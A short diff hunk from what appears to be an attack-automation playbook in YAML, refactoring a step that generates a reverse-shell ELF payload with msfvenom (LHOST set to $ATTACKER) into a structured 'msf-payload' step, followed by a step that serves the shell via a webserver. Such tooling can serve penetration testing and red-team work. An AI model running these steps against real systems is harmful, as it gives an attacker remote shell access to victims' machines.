@@ -30,8 +30,13 @@ commands:
     variable: RSHELL
 
   # generate reverse shell
-  - type: shell
-    cmd: ../metasploit-framework/msfvenom -p $PAYLOAD LHOST=$ATTACKER LPORT=$LPORT -f elf > ${RSHELL}
+  - type: msf-payload
+    cmd: $PAYLOAD
+    payload_options:
+      LHOST: $ATTACKER
+      LPORT: $LPORT
+    format: elf
+    local_path: $RSHELL
 
   # serve the reverse shell via webserver in background mode
   - type: webserv
